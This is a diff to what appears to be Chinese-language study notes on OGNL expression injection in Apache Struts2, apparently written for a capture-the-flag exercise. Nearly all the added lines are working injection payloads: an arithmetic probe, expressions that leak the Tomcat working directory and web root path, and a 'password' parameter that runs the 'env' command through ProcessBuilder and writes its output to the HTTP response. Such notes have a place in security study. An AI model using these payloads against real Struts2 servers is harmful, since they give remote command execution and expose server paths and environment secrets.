@@ -188,6 +188,20 @@ expression.setValue(context, "payload");
 具体参考
 <https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x01-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80>
 ```
+%{2+2}
+
+// 获取tomcat路径
+%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
+
+// 获取web路径
+%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
+
+// 命令执行 env，flag就在其中
+password=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}&username=1
+
+
+
+
 //获取context里面的变量
  #user
  #user.name
